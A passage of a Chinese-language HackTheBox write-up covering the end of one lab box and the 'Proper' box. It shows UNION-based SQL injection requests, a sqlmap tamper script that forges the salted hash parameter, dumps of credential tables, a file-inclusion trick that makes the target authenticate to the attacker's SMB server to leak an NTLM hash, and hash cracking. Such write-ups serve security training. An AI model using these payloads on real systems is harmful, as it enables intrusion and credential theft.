class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">44</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+3Ch] [rbp-24h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+4Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(v6, argv, envp);</span><br><span class="line">  v8 = curl_easy_init();</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;Krypter V1.2\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;New project by Juliette.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;New features added weekly!\n&quot;</span></span><br><span class="line">    <span class="string">&quot;What to expect next update:\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\t- Windows version with GUI support\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\t- Get password from cloud and AUTOMATICALLY decrypt!\n&quot;</span></span><br><span class="line">    <span class="string">&quot;***\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( argc == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = i;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt;= <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v10 += argv[<span class="number">1</span>][i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v10 == <span class="number">1601</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v8 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Requesting decryption key from cloud...\nAccount: Administrator&quot;</span>);</span><br><span class="line">        curl_easy_setopt(v8, <span class="number">10002LL</span>, (__int64)<span class="string">&quot;http://passmanager.htb:1234/index.php&quot;</span>);</span><br><span class="line">        curl_easy_setopt(v8, <span class="number">10015LL</span>, (__int64)<span class="string">&quot;method=select&amp;username=administrator&amp;table=passwords&quot;</span>);</span><br><span class="line">        curl_easy_setopt(v8, <span class="number">20011LL</span>, (__int64)WriteCallback);</span><br><span class="line">        curl_easy_setopt(v8, <span class="number">10001LL</span>, (__int64)v6);</span><br><span class="line">        v7 = curl_easy_perform(v8);</span><br><span class="line">        curl_easy_cleanup(v8);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Server response:\n\n&quot;</span>);</span><br><span class="line">        v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, v6);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Incorrect master key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No key supplied.\nUSAGE:\n\nKrypter &lt;key&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -ant</span><br><span class="line"></span><br><span class="line">  TCP    127.0.0.1:1234         0.0.0.0:0              LISTENING       InHost</span><br></pre></td></tr></table></figure>
<p>用程序中的URL访问</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=administrator&amp;table=passwords&quot;</span></span><br><span class="line"></span><br><span class="line">selectarray(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  array(1) &#123;</span><br><span class="line">    [<span class="string">&quot;aes_key&quot;</span>]=&gt;</span><br><span class="line">    string(16) <span class="string">&quot;k19D193j.&lt;19391(&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到AES_KEY</p>
<p>尝试SQL注入</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+or+1%23&amp;table=passwords&quot;</span></span><br><span class="line">selectarray(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  array(1) &#123;</span><br><span class="line">    [<span class="string">&quot;aes_key&quot;</span>]=&gt;</span><br><span class="line">    string(16) <span class="string">&quot;k19D193j.&lt;19391(&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>手工注入</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+or+1%23&amp;table=passwords&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+1%23&amp;table=passwords&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+database()%23&amp;table=passwords&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+group_concat(table_name)+from+information_schema.tables+where+table_schema=&#x27;bread&#x27;%23&amp;table=passwords&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+group_concat(column_name)+from+information_schema.columns+where+table_name=&#x27;passwords&#x27;%23&amp;table=passwords&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+group_concat(password)+from+bread.passwords%23&amp;table=passwords&quot;</span></span><br></pre></td></tr></table></figure>
<p>得到<code>H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=</code></p>
<ul>
<li>SSH端口映射跑SQLMap</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -L 1234:127.0.0.1:1234 development@10.10.10.228</span><br><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=administrator&amp;table=passwords&quot;</span></span><br></pre></td></tr></table></figure>
<p>sqlmap的步骤就懒得写了</p>
<p>解密</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">iv = <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line">cipher = base64.b64decode(<span class="string">&quot;H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=&quot;</span>)</span><br><span class="line">_aes = AES.new(<span class="string">b&quot;k19D193j.&lt;19391(&quot;</span>, AES.MODE_CBC, iv)</span><br><span class="line">plain = _aes.decrypt(cipher)</span><br><span class="line">print(plain)</span><br></pre></td></tr></table></figure>
<p>得到凭证<code>administrator:p@ssw0rd!@#$9890./</code><br />
登入SSH服务</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\Users\Administrator\Desktop\root.txt</span><br><span class="line">c04f72045d76a74c63a602f199a79ecd</span><br></pre></td></tr></table></figure>
<p>挺综合的一台机器</p>
<hr />
<h1 id="hackthebox_proper"><a class="markdownIt-Anchor" href="#hackthebox_proper"></a> HackTheBox_Proper</h1>
<h2 id="端口扫描-4"><a class="markdownIt-Anchor" href="#端口扫描-4"></a> 端口扫描</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.231</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.231</span><br><span class="line">Host is up (0.081s latency).</span><br><span class="line">Not shown: 999 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 10.0</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
<h2 id="路径扫描-2"><a class="markdownIt-Anchor" href="#路径扫描-2"></a> 路径扫描</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http://10.10.10.231/ ----</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.231/assets/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.231/licenses/</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-4"><a class="markdownIt-Anchor" href="#漏洞利用-4"></a> 漏洞利用</h2>
<p>浏览主页源码看到</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="meta">	&#x27;use strict&#x27;</span>;</span><br><span class="line">	jQuery(<span class="string">&#x27;#headerwrap&#x27;</span>).backstretch([ <span class="string">&quot;assets/img/bg/bg1.jpg&quot;</span>, <span class="string">&quot;assets/img/bg/bg3.jpg&quot;</span> ], &#123;<span class="attr">duration</span>: <span class="number">8000</span>, <span class="attr">fade</span>: <span class="number">500</span>&#125;);</span><br><span class="line">	$( <span class="string">&quot;#product-content&quot;</span> ).load(<span class="string">&quot;/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b&quot;</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.231/products-ajax.php</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">// [8] Undefined index: order On line 6 in file C:\inetpub\wwwroot\products-ajax.php</span></span><br><span class="line">	define(<span class="string">&#x27;SECURE_PARAM_SALT&#x27;</span>,<span class="string">&#x27;hie0shah6ooNoim&#x27;</span>); </span><br><span class="line">	<span class="keyword">include</span>(<span class="string">&#x27;functions.php&#x27;</span>); </span><br><span class="line">	<span class="keyword">include</span>(<span class="string">&#x27;db-config.php&#x27;</span>); </span><br><span class="line">	<span class="keyword">if</span> ( !<span class="variable">$_GET</span>[<span class="string">&#x27;order&#x27;</span>] || !<span class="variable">$_GET</span>[<span class="string">&#x27;h&#x27;</span>] ) &#123;</span><br><span class="line">		<span class="comment">// Set the response code to 500 </span></span><br><span class="line">		http_response_code(<span class="number">500</span>); </span><br><span class="line">		<span class="comment">// and die(). Someone fiddled with the parameters. </span></span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Parameter missing or malformed.&#x27;</span>); </span><br><span class="line">	&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>测试得到以下算法<br />
<code>Hash = md5(Salt+Payload)</code></p>
<p>SQLMap tamper</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">	salt = <span class="string">b&quot;hie0shah6ooNoim&quot;</span></span><br><span class="line">	h = hashlib.md5(salt + payload.encode()).hexdigest()</span><br><span class="line">	retVal = <span class="string">&quot;&#123;&#125;&amp;h=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload, h)</span><br><span class="line">	<span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py --dbs --batch --skip-urlencode</span><br><span class="line">available databases [3]:</span><br><span class="line">[*] cleaner</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py -D cleaner --tables --batch --skip-urlencode</span><br><span class="line">Database: cleaner</span><br><span class="line">[3 tables]</span><br><span class="line">+-----------+</span><br><span class="line">| customers |</span><br><span class="line">| licenses  |</span><br><span class="line">| products  |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py -D cleaner -T licenses --columns --batch --skip-urlencode</span><br><span class="line">Database: cleaner</span><br><span class="line">Table: licenses</span><br><span class="line">[4 columns]</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| Column      | Type        |</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| customer_id | int(11)     |</span><br><span class="line">| id          | int(11)     |</span><br><span class="line">| license     | varchar(50) |</span><br><span class="line">| product_id  | int(11)     |</span><br><span class="line">+-------------+-------------+</span><br><span class="line"></span><br><span class="line">proxychains sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py -D cleaner -T licenses -D customer_id,id,license,product_id --dump --batch --skip-urlencode</span><br><span class="line">Database: cleaner</span><br><span class="line">Table: licenses</span><br><span class="line">[18 entries]</span><br><span class="line">+-------------+----+--------------------------------------+------------+</span><br><span class="line">| customer_id | id | license                              | product_id |</span><br><span class="line">+-------------+----+--------------------------------------+------------+</span><br><span class="line">| 4           | 1  | 7d4cdf91-119b-414d-b16b-7cb841b2c182 | 4          |</span><br><span class="line">| 17          | 2  | e7b59b20-8c70-48b0-91da-58bf354b18d5 | 8          |</span><br><span class="line">| 17          | 3  | 3ea26f9c-f7c8-428f-a613-f4c66f08d0b9 | 6          |</span><br><span class="line">| 17          | 4  | 372b02bd-8730-4bc6-a6fb-8cf9726f797b | 4          |</span><br><span class="line">| 15          | 5  | 75ab3363-43d4-4e6b-903a-9d36919b36be | 8          |</span><br><span class="line">| 16          | 6  | 139aff78-770c-4c59-9aef-32c4c65e68b3 | 4          |</span><br><span class="line">| 22          | 7  | bdf82583-9f1a-42a3-b892-4b569e77f4c9 | 2          |</span><br><span class="line">| 11          | 8  | d7da6b56-6f8c-4a26-85cc-c80860f3021a | 8          |</span><br><span class="line">| 21          | 9  | 2ca03799-bd0d-4baa-a163-eb2a3b143f22 | 4          |</span><br><span class="line">| 7           | 10 | 0a65e4e4-f1c7-4452-9bf0-02f4d6c35410 | 4          |</span><br><span class="line">| 7           | 11 | 2e14ce43-8e85-43d7-b9ae-ab2c2ff64bf8 | 4          |</span><br><span class="line">| 15          | 12 | 873f8add-2f3c-4da2-9164-649f55c1d329 | 4          |</span><br><span class="line">| 2           | 13 | c63524b6-6346-4a34-b5c3-a3fe46593df1 | 4          |</span><br><span class="line">| 25          | 14 | ad228131-518a-4527-8a1c-46d0723b691d | 2          |</span><br><span class="line">| 1           | 15 | 4fa6a5cd-2081-4222-9b46-6c58df72bcfd | 8          |</span><br><span class="line">| 1           | 16 | 183a7e47-e3cf-46f9-80fa-acb63590cc1c | 2          |</span><br><span class="line">| 9           | 17 | 49dea5ef-3f7f-4790-9b94-b6bf29f5f893 | 2          |</span><br><span class="line">| 4           | 18 | 41e5be3a-20fc-47b2-9dcc-c05def688cdb | 6          |</span><br><span class="line">+-------------+----+--------------------------------------+------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py -D cleaner -T customers --columns --batch --skip-urlencode</span><br><span class="line">Database: cleaner</span><br><span class="line">Table: customers</span><br><span class="line">[4 columns]</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| Column        | Type         |</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| customer_name | varchar(50)  |</span><br><span class="line">| id            | int(11)      |</span><br><span class="line">| login         | varchar(255) |</span><br><span class="line">| password      | varchar(255) |</span><br><span class="line">+---------------+--------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py -D cleaner -T customers -C customer_name,id,login,password --dump --batch --skip-urlencode</span><br><span class="line">Database: cleaner</span><br><span class="line">Table: customers</span><br><span class="line">[11 entries]</span><br><span class="line">+---------------------+----+------------------------------+----------------------------------+</span><br><span class="line">| customer_name       | id | login                        | password                         |</span><br><span class="line">+---------------------+----+------------------------------+----------------------------------+</span><br><span class="line">| Vikki Solomon       | 1  | vikki.solomon@throwaway.mail | 7c6a180b36896a0a8c02787eeafb0e4c |</span><br><span class="line">| Neave Stone         | 2  | nstone@trashbin.mail         | 6cb75f652a9b52798eb6cf2201057c73 |</span><br><span class="line">| Bertie McEachern    | 3  | bmceachern7@discovery.moc    | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">| Jordana Kleiser     | 4  | jkleiser8@google.com.xy      | 827ccb0eea8a706c4c34a16891f84e7b |</span><br><span class="line">| Mariellen Chasemore | 5  | mchasemore9@sitemeter.moc    | 25f9e794323b453885f5181f1b624d0b |</span><br><span class="line">| Gwyneth Dornin      | 6  | gdornina@marriott.moc        | 5f4dcc3b5aa765d61d8327deb882cf99 |</span><br><span class="line">| Israel Tootell      | 7  | itootellb@forbes.moc         | f25a2fc72690b780b2a14e140ef6a9e0 |</span><br><span class="line">| Karon Mangham       | 8  | kmanghamc@state.tx.su        | 8afa847f50a716e64932d995c8e7435a |</span><br><span class="line">| Janifer Blinde      | 9  | jblinded@bing.moc            | fcea920f7412b5da7be0cf42b8c93759 |</span><br><span class="line">| Laurens Lenchenko   | 10 | llenchenkoe@macromedia.moc   | f806fc5a2a0d5ba2471600758452799c |</span><br><span class="line">| Andreana Austin     | 11 | aaustinf@booking.moc         | 25d55ad283aa400af464c76d713c07ad |</span><br><span class="line">+---------------------+----+------------------------------+----------------------------------+</span><br></pre></td></tr></table></figure>
<p>MD5基本都是弱口令</p>
<p>随意用一个凭证登入</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.231/licenses/licenses.php?theme=&amp;h=9094e65be4a9dc27cd4af70674a99c64</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">// [2] include(/header.inc): failed to open stream: No such file or directory On line 36 in file C:\inetpub\wwwroot\functions.php</span></span><br><span class="line">	<span class="comment">// Following function securely includes a file. Whenever we </span></span><br><span class="line">	<span class="comment">// will encounter a PHP tag we will just bail out here. </span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">secure_include</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">		<span class="keyword">if</span> (strpos(file_get_contents(<span class="variable">$file</span>),<span class="string">&#x27;&lt;?&#x27;</span>) === <span class="literal">false</span>) &#123; </span><br><span class="line">			<span class="keyword">include</span>(<span class="variable">$file</span>);                <span class="comment">//&lt;&lt;&lt;&lt;&lt; Error encountered in this line.</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">			http_response_code(<span class="number">403</span>); </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Forbidden - Tampering attempt detected.&#x27;</span>); </span><br><span class="line">		&#125; </span><br><span class="line">	&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>尝试RFI</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 9998</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.231/licenses/licenses.php?theme=http://10.10.16.7:9998/&amp;h=c68113684a9e7ddca835d8f0235e2759</span><br><span class="line"></span><br><span class="line">[2] include(): http:// wrapper is disabled <span class="keyword">in</span> the server configuration by allow_url_include=0</span><br><span class="line">On line 36 <span class="keyword">in</span> file C:\inetpub\wwwroot\functions.php</span><br></pre></td></tr></table></figure>
<p>不能使用http协议</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 smbserver.py -ip 10.10.16.7 -smb2support evil .</span><br><span class="line">curl http://10.10.10.231/licenses/licenses.php?theme=//10.10.16.7&amp;h=b1a3d9ecf02d4854f3a730f8b2a9af5d</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] Incoming connection (10.10.10.231,51174)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (PROPER\web,PROPER)</span><br><span class="line">[*] User PROPER\web authenticated successfully</span><br><span class="line">[*] web::PROPER:aaaaaaaaaaaaaaaa:956a52cc975ff5da7c40b3a88a2280cd:0101000000000000808cbaf62b60d701fee1b72b5916ee630000000001001000670049005600790046004b0055006a00020010005a004a006b004300690054006a00480003001000670049005600790046004b0055006a00040010005a004a006b004300690054006a00480007000800808cbaf62b60d70106000400020000000800300030000000000000000000000000200000df729e7896fc8038dada23bc657eaeb31358ef464f456b1fa869efec2d18cea10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0037000000000000000000</span><br><span class="line">[*] Closing down connection (10.10.10.231,51174)</span><br><span class="line">[*] Remaining connections []</span><br></pre></td></tr></table></figure>
<p>拿到Hash</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="built_in">hash</span> </span><br><span class="line">web::PROPER:aaaaaaaaaaaaaaaa:956a52cc975ff5da7c40b3a88a2280cd:0101000000000000808cbaf62b60d701fee1b72b5916ee630000000001001000670049005600790046004b0055006a00020010005a004a006b004300690054006a00480003001000670049005600790046004b0055006a00040010005a004a006b004300690054006a00480007000800808cbaf62b60d70106000400020000000800300030000000000000000000000000200000df729e7896fc8038dada23bc657eaeb31358ef464f456b1fa869efec2d18cea10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0037000000000000000000</span><br><span class="line"></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br><span class="line">charlotte123!    (web)</span><br></pre></td></tr></table></figure>
<p>得到凭证</p>
